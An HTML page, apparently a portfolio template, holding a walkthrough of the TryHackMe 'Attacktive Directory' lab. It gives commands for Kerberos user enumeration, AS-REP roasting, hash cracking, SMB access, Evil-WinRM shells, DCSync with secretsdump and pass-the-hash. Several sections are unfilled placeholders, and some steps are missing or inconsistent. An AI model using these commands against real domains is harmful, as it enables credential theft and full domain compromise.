@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Attacktive Directory — TryHackMe | Natan Santos</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg:      #0a0c0f;
+      --bg2:     #0f1217;
+      --bg3:     #141820;
+      --border:  #1e2530;
+      --accent:  #00e5a0;
+      --acc2:    #00b37a;
+      --red:     #ff4d6a;
+      --yellow:  #f5c518;
+      --blue:    #4d9fff;
+      --text:    #c8d0dc;
+      --muted:   #5a6475;
+      --white:   #edf1f7;
+      --mono:    'Space Mono', monospace;
+      --sans:    'Syne', sans-serif;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 14px;
+      line-height: 1.8;
+      overflow-x: hidden;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 999; opacity: .4;
+    }
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--acc2); border-radius: 2px; }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      background: rgba(10,12,15,.9);
+      backdrop-filter: blur(14px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-inner {
+      max-width: 860px; margin: 0 auto;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 16px 24px;
+    }
+    .nav-logo {
+      font-family: var(--sans); font-weight: 800; font-size: 17px;
+      color: var(--white); text-decoration: none; letter-spacing: -0.5px;
+    }
+    .nav-logo span { color: var(--accent); }
+    .nav-back {
+      display: flex; align-items: center; gap: 8px;
+      color: var(--muted); text-decoration: none;
+      font-size: 11px; letter-spacing: .1em; text-transform: uppercase;
+      transition: color .2s;
+    }
+    .nav-back:hover { color: var(--accent); }
+
+    /* LAYOUT */
+    .page { max-width: 860px; margin: 0 auto; padding: 0 24px; }
+
+    /* HERO */
+    .writeup-hero {
+      padding: 110px 0 52px;
+      border-bottom: 1px solid var(--border);
+      position: relative; overflow: hidden;
+    }
+    .grid-bg {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(77,159,255,.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(77,159,255,.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      mask-image: radial-gradient(ellipse 100% 100% at 100% 0%, black 20%, transparent 70%);
+    }
+    .hero-inner { position: relative; z-index: 1; }
+    .hero-meta {
+      display: flex; align-items: center; gap: 10px;
+      flex-wrap: wrap; margin-bottom: 20px;
+    }
+    .meta-tag {
+      font-size: 10px; letter-spacing: .12em; text-transform: uppercase;
+      padding: 4px 12px; border-radius: 2px;
+    }
+    .tag-platform {
+      background: rgba(77,159,255,.1); border: 1px solid rgba(77,159,255,.25);
+      color: var(--blue);
+    }
+    .tag-diff {
+      background: rgba(245,197,24,.08); border: 1px solid rgba(245,197,24,.25);
+      color: var(--yellow);
+    }
+    .tag-category {
+      background: var(--bg3); border: 1px solid var(--border);
+      color: var(--muted);
+    }
+    .writeup-title {
+      font-family: var(--sans); font-weight: 800;
+      font-size: clamp(28px, 5vw, 52px);
+      color: var(--white); letter-spacing: -1.5px;
+      line-height: 1; margin-bottom: 18px;
+    }
+    .writeup-title span { color: var(--blue); }
+    .writeup-summary {
+      font-size: 14px; color: var(--muted);
+      max-width: 620px; line-height: 1.85;
+      margin-bottom: 28px;
+    }
+    .hero-stats {
+      display: flex; gap: 0;
+      border: 1px solid var(--border);
+      width: fit-content; overflow: hidden;
+    }
+    .hstat {
+      padding: 12px 20px;
+      border-right: 1px solid var(--border);
+      background: var(--bg2);
+    }
+    .hstat:last-child { border-right: none; }
+    .hstat-val {
+      font-family: var(--sans); font-weight: 700;
+      font-size: 15px; color: var(--white);
+    }
+    .hstat-key {
+      font-size: 9px; letter-spacing: .12em;
+      text-transform: uppercase; color: var(--muted);
+      margin-top: 2px;
+    }
+
+    /* TOC */
+    .toc-wrap {
+      margin: 40px 0 0;
+      background: var(--bg2); border: 1px solid var(--border);
+      padding: 24px 28px;
+    }
+    .toc-title {
+      font-size: 11px; letter-spacing: .12em; text-transform: uppercase;
+      color: var(--accent); margin-bottom: 14px;
+    }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 4px; }
+    .toc-list a {
+      color: var(--muted); text-decoration: none; font-size: 13px;
+      transition: color .15s; display: flex; align-items: center; gap: 10px;
+    }
+    .toc-list a:hover { color: var(--accent); }
+    .toc-list a::before { content: '§'; color: var(--border); font-size: 11px; }
+    .toc-num { color: var(--border); font-size: 11px; width: 18px; flex-shrink: 0; }
+
+    /* CONTENT */
+    .writeup-body { padding: 60px 0 100px; }
+
+    .w-section {
+      margin-bottom: 64px;
+      padding-bottom: 64px;
+      border-bottom: 1px solid var(--border);
+    }
+    .w-section:last-child { border-bottom: none; }
+
+    .w-section-label {
+      font-size: 10px; letter-spacing: .15em; text-transform: uppercase;
+      color: var(--accent); margin-bottom: 8px;
+    }
+    .w-section-title {
+      font-family: var(--sans); font-weight: 800;
+      font-size: clamp(20px, 3vw, 28px);
+      color: var(--white); letter-spacing: -.5px;
+      margin-bottom: 20px; line-height: 1.1;
+    }
+    .w-section-title .step-num {
+      color: var(--border); font-size: .75em;
+      margin-right: 6px;
+    }
+
+    p { color: var(--text); font-size: 14px; line-height: 1.85; margin-bottom: 16px; }
+    p:last-child { margin-bottom: 0; }
+
+    /* CODE BLOCKS */
+    .cmd {
+      background: var(--bg3); border: 1px solid var(--border);
+      border-left: 3px solid var(--accent);
+      padding: 16px 20px; margin: 20px 0;
+      overflow-x: auto; position: relative;
+    }
+    .cmd-label {
+      font-size: 9px; letter-spacing: .12em; text-transform: uppercase;
+      color: var(--muted); margin-bottom: 8px;
+    }
+    .cmd code {
+      font-family: var(--mono); font-size: 13px;
+      color: var(--accent); white-space: pre; display: block;
+    }
+    .cmd.output { border-left-color: var(--blue); }
+    .cmd.output code { color: var(--text); }
+    .cmd.hash { border-left-color: var(--yellow); }
+    .cmd.hash code { color: var(--yellow); word-break: break-all; white-space: pre-wrap; }
+
+    /* SCREENSHOT */
+    .screenshot {
+      margin: 24px 0;
+      border: 1px solid var(--border);
+      overflow: hidden;
+    }
+    .screenshot-label {
+      background: var(--bg3); border-bottom: 1px solid var(--border);
+      padding: 8px 16px;
+      font-size: 10px; letter-spacing: .1em; text-transform: uppercase;
+      color: var(--muted); display: flex; align-items: center; gap: 8px;
+    }
+    .screenshot-label::before { content: '●'; color: var(--red); font-size: 8px; }
+    .screenshot-label::after { content: '— screenshot'; color: var(--border); }
+    .screenshot img {
+      width: 100%; display: block;
+      /* Quando não tiver imagem ainda, mostra placeholder */
+    }
+    .screenshot-placeholder {
+      background: var(--bg2);
+      min-height: 200px;
+      display: flex; align-items: center; justify-content: center;
+      flex-direction: column; gap: 10px;
+    }
+    .screenshot-placeholder-icon { font-size: 28px; opacity: .2; }
+    .screenshot-placeholder-text {
+      font-size: 11px; letter-spacing: .1em; text-transform: uppercase;
+      color: var(--border);
+    }
+
+    /* CALLOUTS */
+    .callout {
+      background: var(--bg2); border: 1px solid var(--border);
+      border-left: 3px solid var(--yellow);
+      padding: 16px 20px; margin: 20px 0;
+      font-size: 13px; color: var(--text);
+    }
+    .callout.info  { border-left-color: var(--blue); }
+    .callout.win   { border-left-color: var(--accent); }
+    .callout.alert { border-left-color: var(--red); }
+    .callout-title {
+      font-size: 10px; letter-spacing: .12em; text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+    .callout.win   .callout-title { color: var(--accent); }
+    .callout.info  .callout-title { color: var(--blue); }
+    .callout       .callout-title { color: var(--yellow); }
+    .callout.alert .callout-title { color: var(--red); }
+
+    /* FLAGS */
+    .flag-box {
+      background: rgba(0,229,160,.05);
+      border: 1px solid rgba(0,229,160,.2);
+      padding: 16px 20px; margin: 20px 0;
+      display: flex; align-items: center; gap: 14px;
+    }
+    .flag-icon { font-size: 20px; }
+    .flag-label {
+      font-size: 10px; letter-spacing: .12em; text-transform: uppercase;
+      color: var(--accent); margin-bottom: 4px;
+    }
+    .flag-value { font-size: 13px; color: var(--white); font-family: var(--mono); }
+
+    /* TOOLS TABLE */
+    .tools-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
+    .tools-table th {
+      font-size: 10px; letter-spacing: .1em; text-transform: uppercase;
+      color: var(--muted); text-align: left; padding: 10px 14px;
+      border-bottom: 1px solid var(--border); background: var(--bg3);
+    }
+    .tools-table td {
+      font-size: 12px; color: var(--text);
+      padding: 10px 14px; border-bottom: 1px solid var(--border);
+    }
+    .tools-table tr:hover td { background: var(--bg2); }
+    .tool-name { color: var(--accent); }
+
+    /* ATTACK CHAIN */
+    .attack-chain {
+      display: flex; align-items: center; flex-wrap: wrap;
+      gap: 0; margin: 24px 0;
+    }
+    .chain-step {
+      background: var(--bg2); border: 1px solid var(--border);
+      padding: 10px 16px; font-size: 11px;
+      letter-spacing: .06em; text-transform: uppercase; color: var(--text);
+    }
+    .chain-arrow {
+      color: var(--accent); font-size: 14px; padding: 0 4px;
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+      background: var(--bg3); padding: 10px 8px;
+    }
+
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 28px 24px; text-align: center;
+      font-size: 11px; color: var(--muted);
+    }
+    footer span { color: var(--accent); }
+
+    @media (max-width: 640px) {
+      .hero-stats { flex-direction: column; width: 100%; }
+      .hstat { border-right: none; border-bottom: 1px solid var(--border); }
+      .attack-chain { flex-direction: column; align-items: flex-start; }
+      .chain-arrow { transform: rotate(90deg); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-inner">
+    <a href="../../index.html" class="nav-logo">natan<span>.sec</span></a>
+    <a href="../index.html" class="nav-back">← writeups</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="grid-bg"></div>
+  <div class="page hero-inner">
+    <div class="hero-meta">
+      <span class="meta-tag tag-platform">TryHackMe</span>
+      <span class="meta-tag tag-diff">Medium</span>
+      <span class="meta-tag tag-category">Active Directory</span>
+      <span class="meta-tag tag-category">Kerberos</span>
+      <span class="meta-tag tag-category">Windows</span>
+    </div>
+    <h1 class="writeup-title">Attacktive<br><span>Directory</span></h1>
+    <p class="writeup-summary">
+      <!-- EDITE: escreva em 2-3 frases o que você aprendeu / o que achou interessante no room.
+           Não precisa ser um resumo técnico — pode ser sua perspectiva pessoal. -->
+      Full Active Directory exploitation path covering Kerberos enumeration,
+      AS-REP Roasting, credential abuse via SMB, and domain compromise with
+      secretsdump. A solid intro to AD attack chains in a guided environment.
+    </p>
+    <div class="hero-stats">
+      <div class="hstat">
+        <p class="hstat-val">TryHackMe</p>
+        <p class="hstat-key">Platform</p>
+      </div>
+      <div class="hstat">
+        <p class="hstat-val" style="color:var(--yellow)">Medium</p>
+        <p class="hstat-key">Difficulty</p>
+      </div>
+      <div class="hstat">
+        <!-- EDITE: coloque a data que você completou -->
+        <p class="hstat-val">DD MMM YYYY</p>
+        <p class="hstat-key">Completed</p>
+      </div>
+      <div class="hstat">
+        <p class="hstat-val">Windows / AD</p>
+        <p class="hstat-key">OS / Category</p>
+      </div>
+    </div>
+
+    <!-- TABLE OF CONTENTS -->
+    <div class="toc-wrap">
+      <p class="toc-title">// contents</p>
+      <ul class="toc-list">
+        <li><a href="#recon"><span class="toc-num">01</span>Reconnaissance — Nmap</a></li>
+        <li><a href="#enum-dc"><span class="toc-num">02</span>Enumerating the Domain Controller</a></li>
+        <li><a href="#kerbrute"><span class="toc-num">03</span>User Enumeration with Kerbrute</a></li>
+        <li><a href="#asrep"><span class="toc-num">04</span>AS-REP Roasting</a></li>
+        <li><a href="#cracking"><span class="toc-num">05</span>Cracking the Hash</a></li>
+        <li><a href="#smb"><span class="toc-num">06</span>SMB Enumeration & Credential Abuse</a></li>
+        <li><a href="#winrm"><span class="toc-num">07</span>Shell via Evil-WinRM</a></li>
+        <li><a href="#secretsdump"><span class="toc-num">08</span>Domain Compromise — secretsdump</a></li>
+        <li><a href="#flags"><span class="toc-num">09</span>Flags</a></li>
+        <li><a href="#lessons"><span class="toc-num">10</span>Lessons Learned</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- BODY -->
+<div class="writeup-body">
+  <div class="page">
+
+    <!-- ATTACK CHAIN OVERVIEW -->
+    <div class="w-section">
+      <p class="w-section-label">// overview</p>
+      <h2 class="w-section-title">Attack Chain</h2>
+      <div class="attack-chain">
+        <span class="chain-step">Nmap Scan</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step">Kerbrute Enum</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step">AS-REP Roast</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step">Hash Crack</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step">SMB Abuse</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step">Evil-WinRM</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step">secretsdump</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-step" style="border-color:rgba(0,229,160,.3);color:var(--accent)">Domain Admin</span>
+      </div>
+
+      <h3 style="font-family:var(--sans);color:var(--white);font-size:15px;margin:28px 0 12px;">Tools Used</h3>
+      <table class="tools-table">
+        <thead>
+          <tr>
+            <th>Tool</th>
+            <th>Purpose</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td class="tool-name">nmap</td><td>Port scanning & service enumeration</td></tr>
+          <tr><td class="tool-name">enum4linux</td><td>SMB/NetBIOS enumeration</td></tr>
+          <tr><td class="tool-name">kerbrute</td><td>Kerberos user enumeration</td></tr>
+          <tr><td class="tool-name">GetNPUsers.py (Impacket)</td><td>AS-REP Roasting</td></tr>
+          <tr><td class="tool-name">hashcat</td><td>Offline hash cracking</td></tr>
+          <tr><td class="tool-name">smbclient</td><td>SMB share access</td></tr>
+          <tr><td class="tool-name">evil-winrm</td><td>Remote shell via WinRM</td></tr>
+          <tr><td class="tool-name">secretsdump.py (Impacket)</td><td>Dumping domain hashes</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- 01 RECON -->
+    <div class="w-section" id="recon">
+      <p class="w-section-label">// 01 · reconnaissance</p>
+      <h2 class="w-section-title"><span class="step-num">01</span>Nmap Scan</h2>
+
+      <p>
+        <!-- EDITE: descreva brevemente o que você fez e por quê. Ex: qual flag usou e por quê -->
+        Starting with a full port scan to identify open services and understand what we're dealing with.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">command</p>
+        <code>nmap -sC -sV -oA nmap/attacktive -T4 &lt;TARGET_IP&gt;</code>
+      </div>
+
+      <!-- Screenshot: substitua o placeholder pela tag img quando tiver o print -->
+      <div class="screenshot">
+        <div class="screenshot-label">01-nmap</div>
+        <!-- QUANDO TIVER O PRINT: apague o screenshot-placeholder abaixo e descomente o img
+        <img src="assets/01-nmap.png" alt="Nmap scan output" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/01-nmap.png</p>
+        </div>
+      </div>
+
+      <div class="cmd output">
+        <p class="cmd-label">output — ports of interest</p>
+        <code><!-- COLE AQUI O TRECHO RELEVANTE DO OUTPUT DO NMAP -->
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          (Domain: spookysec.local)
+445/tcp  open  microsoft-ds
+3268/tcp open  ldap
+3389/tcp open  ms-wbt-server</code>
+      </div>
+
+      <p>
+        <!-- EDITE: o que os resultados te disseram? O que chamou atenção? -->
+        The presence of ports 88 (Kerberos), 389 (LDAP), and 445 (SMB) immediately confirms
+        this is a Domain Controller. The domain name <code style="color:var(--accent)">spookysec.local</code>
+        is leaked by the LDAP service — first thing to add to <code style="color:var(--accent)">/etc/hosts</code>.
+      </p>
+
+      <div class="callout info">
+        <p class="callout-title">note</p>
+        <!-- EDITE: qualquer observação relevante, rabbit hole, ou detalhe que achou interessante -->
+        Add the target IP and domain to /etc/hosts before proceeding:<br>
+        <code style="color:var(--blue)">&lt;TARGET_IP&gt;  spookysec.local</code>
+      </div>
+    </div>
+
+    <!-- 02 ENUM DC -->
+    <div class="w-section" id="enum-dc">
+      <p class="w-section-label">// 02 · enumeration</p>
+      <h2 class="w-section-title"><span class="step-num">02</span>Enumerating the Domain Controller</h2>
+
+      <p>
+        <!-- EDITE -->
+        Using enum4linux against ports 139/445 to gather NetBIOS and SMB information.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">command</p>
+        <code>enum4linux -a spookysec.local</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">02-enum4linux</div>
+        <!--
+        <img src="assets/02-enum4linux.png" alt="enum4linux output" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/02-enum4linux.png</p>
+        </div>
+      </div>
+
+      <p>
+        <!-- EDITE: o que você encontrou? Domain name, workgroup, etc. -->
+        Key findings: NetBIOS domain name <code style="color:var(--accent)">THM-AD</code>,
+        confirming the target is the primary Domain Controller.
+      </p>
+    </div>
+
+    <!-- 03 KERBRUTE -->
+    <div class="w-section" id="kerbrute">
+      <p class="w-section-label">// 03 · user enumeration</p>
+      <h2 class="w-section-title"><span class="step-num">03</span>User Enumeration with Kerbrute</h2>
+
+      <p>
+        <!-- EDITE -->
+        Kerberos allows pre-authentication enumeration — we can probe the KDC with usernames
+        and determine which accounts exist based on the error codes returned.
+        Kerbrute automates this using the <code style="color:var(--accent)">userenum</code> module.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">command</p>
+        <code>./kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">03-kerbrute</div>
+        <!--
+        <img src="assets/03-kerbrute.png" alt="Kerbrute user enumeration" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/03-kerbrute.png</p>
+        </div>
+      </div>
+
+      <div class="cmd output">
+        <p class="cmd-label">valid users found</p>
+        <code><!-- EDITE: cole os usuários encontrados -->
+james@spookysec.local
+svc-admin@spookysec.local
+robin@spookysec.local
+darkstar@spookysec.local
+administrator@spookysec.local
+backup@spookysec.local
+paradox@spookysec.local</code>
+      </div>
+
+      <div class="callout">
+        <p class="callout-title">interesting accounts</p>
+        <!-- EDITE: o que chamou atenção na lista de usuários? -->
+        Two accounts stand out immediately: <strong>svc-admin</strong> (service account — prime
+        AS-REP Roast candidate) and <strong>backup</strong> (likely has elevated privileges
+        for backup operations).
+      </div>
+    </div>
+
+    <!-- 04 ASREP -->
+    <div class="w-section" id="asrep">
+      <p class="w-section-label">// 04 · exploitation</p>
+      <h2 class="w-section-title"><span class="step-num">04</span>AS-REP Roasting</h2>
+
+      <p>
+        <!-- EDITE: explique brevemente o que é AS-REP Roasting na sua própria voz -->
+        AS-REP Roasting targets accounts with Kerberos pre-authentication disabled.
+        When an account has this flag set, anyone can request an AS-REP for that user
+        without knowing the password — the response includes a blob encrypted with the
+        user's password hash, which we can crack offline.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">command</p>
+        <code>python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip &lt;TARGET_IP&gt;</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">04-asreproast</div>
+        <!--
+        <img src="assets/04-asreproast.png" alt="AS-REP Roasting output" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/04-asreproast.png</p>
+        </div>
+      </div>
+
+      <div class="cmd hash">
+        <p class="cmd-label">hash obtained (Kerberos 5 AS-REP etype 23)</p>
+        <code><!-- COLE SEU HASH AQUI (pode mascarar parte se quiser) -->
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX...</code>
+      </div>
+    </div>
+
+    <!-- 05 CRACKING -->
+    <div class="w-section" id="cracking">
+      <p class="w-section-label">// 05 · credential access</p>
+      <h2 class="w-section-title"><span class="step-num">05</span>Cracking the Hash</h2>
+
+      <p>
+        <!-- EDITE -->
+        Saving the hash to a file and cracking it offline with hashcat.
+        Mode <code style="color:var(--accent)">18200</code> is for Kerberos 5 AS-REP.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">command</p>
+        <code>hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">05-hashcat</div>
+        <!--
+        <img src="assets/05-hashcat.png" alt="Hashcat cracking result" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/05-hashcat.png</p>
+        </div>
+      </div>
+
+      <div class="callout win">
+        <p class="callout-title">credentials obtained</p>
+        <!-- EDITE: coloque as credenciais (pode mascarar a senha se quiser) -->
+        svc-admin : &lt;PASSWORD&gt;
+      </div>
+    </div>
+
+    <!-- 06 SMB -->
+    <div class="w-section" id="smb">
+      <p class="w-section-label">// 06 · lateral movement</p>
+      <h2 class="w-section-title"><span class="step-num">06</span>SMB Enumeration & Credential Abuse</h2>
+
+      <p>
+        <!-- EDITE -->
+        With valid credentials, enumerate SMB shares for sensitive data.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">list shares</p>
+        <code>smbclient -L \\\\spookysec.local -U svc-admin</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">06-smbclient-shares</div>
+        <!--
+        <img src="assets/06-smbclient.png" alt="SMB shares listing" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/06-smbclient.png</p>
+        </div>
+      </div>
+
+      <p>
+        <!-- EDITE: o que você encontrou nos shares? Algum arquivo interessante? -->
+        Describe what shares were accessible and what you found inside them.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">access share</p>
+        <code>smbclient \\\\spookysec.local\\&lt;SHARE_NAME&gt; -U svc-admin</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">06-smbclient-files</div>
+        <!--
+        <img src="assets/06-smbclient-files.png" alt="SMB files found" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/06-smbclient-files.png</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- 07 WINRM -->
+    <div class="w-section" id="winrm">
+      <p class="w-section-label">// 07 · initial access</p>
+      <h2 class="w-section-title"><span class="step-num">07</span>Shell via Evil-WinRM</h2>
+
+      <p>
+        <!-- EDITE -->
+        WinRM (port 5985) is open. With valid credentials for the backup account,
+        we can get a shell using Evil-WinRM.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">command</p>
+        <code>evil-winrm -i spookysec.local -u backup -p '&lt;PASSWORD&gt;'</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">07-evil-winrm</div>
+        <!--
+        <img src="assets/07-evil-winrm.png" alt="Evil-WinRM shell" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/07-evil-winrm.png</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- 08 SECRETSDUMP -->
+    <div class="w-section" id="secretsdump">
+      <p class="w-section-label">// 08 · privilege escalation</p>
+      <h2 class="w-section-title"><span class="step-num">08</span>Domain Compromise — secretsdump</h2>
+
+      <p>
+        <!-- EDITE: explique por que o backup account tem esse privilégio -->
+        The backup account has <strong>Replicating Directory Changes</strong> privileges —
+        this is the permission that enables DCSync attacks. Using secretsdump,
+        we replicate domain credentials as if we were a Domain Controller.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">command</p>
+        <code>python3 secretsdump.py spookysec.local/backup:&lt;PASSWORD&gt;@&lt;TARGET_IP&gt;</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">08-secretsdump</div>
+        <!--
+        <img src="assets/08-secretsdump.png" alt="secretsdump output" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/08-secretsdump.png</p>
+        </div>
+      </div>
+
+      <div class="cmd hash">
+        <p class="cmd-label">administrator hash (NTLM)</p>
+        <code><!-- COLE O HASH DO ADMINISTRATOR AQUI -->
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::</code>
+      </div>
+
+      <p>
+        <!-- EDITE: o que você fez com o hash? Pass-the-Hash? Crack? -->
+        With the Administrator NTLM hash, we can pass-the-hash directly with Evil-WinRM
+        without needing to crack it.
+      </p>
+
+      <div class="cmd">
+        <p class="cmd-label">pass-the-hash</p>
+        <code>evil-winrm -i spookysec.local -u Administrator -H &lt;NTLM_HASH&gt;</code>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-label">09-admin-shell</div>
+        <!--
+        <img src="assets/09-root.png" alt="Administrator shell" />
+        -->
+        <div class="screenshot-placeholder">
+          <div class="screenshot-placeholder-icon">🖼</div>
+          <p class="screenshot-placeholder-text">assets/09-root.png</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- 09 FLAGS -->
+    <div class="w-section" id="flags">
+      <p class="w-section-label">// 09 · flags</p>
+      <h2 class="w-section-title"><span class="step-num">09</span>Flags</h2>
+
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <p class="flag-label">svc-admin — user flag</p>
+          <!-- EDITE: cole a flag -->
+          <p class="flag-value">TryHackMe{XXXXXXXXXXXXXXXXXXXXXXXX}</p>
+        </div>
+      </div>
+
+      <div class="flag-box">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <p class="flag-label">backup — flag</p>
+          <p class="flag-value">TryHackMe{XXXXXXXXXXXXXXXXXXXXXXXX}</p>
+        </div>
+      </div>
+
+      <div class="flag-box">
+        <span class="flag-icon">👑</span>
+        <div>
+          <p class="flag-label">Administrator — root flag</p>
+          <p class="flag-value">TryHackMe{XXXXXXXXXXXXXXXXXXXXXXXX}</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- 10 LESSONS LEARNED -->
+    <div class="w-section" id="lessons">
+      <p class="w-section-label">// 10 · takeaways</p>
+      <h2 class="w-section-title"><span class="step-num">10</span>Lessons Learned</h2>
+
+      <p>
+        <!-- EDITE: essa é a seção mais importante para o portfólio.
+             Escreva na sua voz o que você aprendeu, o que foi diferente do que esperava,
+             o que faria diferente numa engajamento real. Recrutadores leem essa seção. -->
+      </p>
+
+      <div class="callout info">
+        <p class="callout-title">key takeaway 1</p>
+        <!-- EDITE -->
+        Kerberos pre-authentication is disabled by default on some legacy AD configurations.
+        In a real engagement, always run GetNPUsers against a full user list — not just service accounts.
+      </div>
+
+      <div class="callout info">
+        <p class="callout-title">key takeaway 2</p>
+        <!-- EDITE -->
+        The backup account having Replicating Directory Changes is a classic misconfiguration.
+        In real environments, look for this in BloodHound under "Find Principals with DCSync Rights".
+      </div>
+
+      <div class="callout">
+        <p class="callout-title">what I'd do differently in a real engagement</p>
+        <!-- EDITE: essa parte diferencia você de outros writeups que só copiam comandos -->
+        Describe how this technique applies (or differs) in a real red team scenario.
+        What detection would this trigger? What would you do to stay stealthy?
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<footer>
+  <p>Natan Oliveira dos Santos · <span>Senior Offensive Security Engineer</span> · <a href="../../writeups/index.html" style="color:var(--muted);text-decoration:none;">← all writeups</a></p>
+</footer>
+
+</body>
+</html>
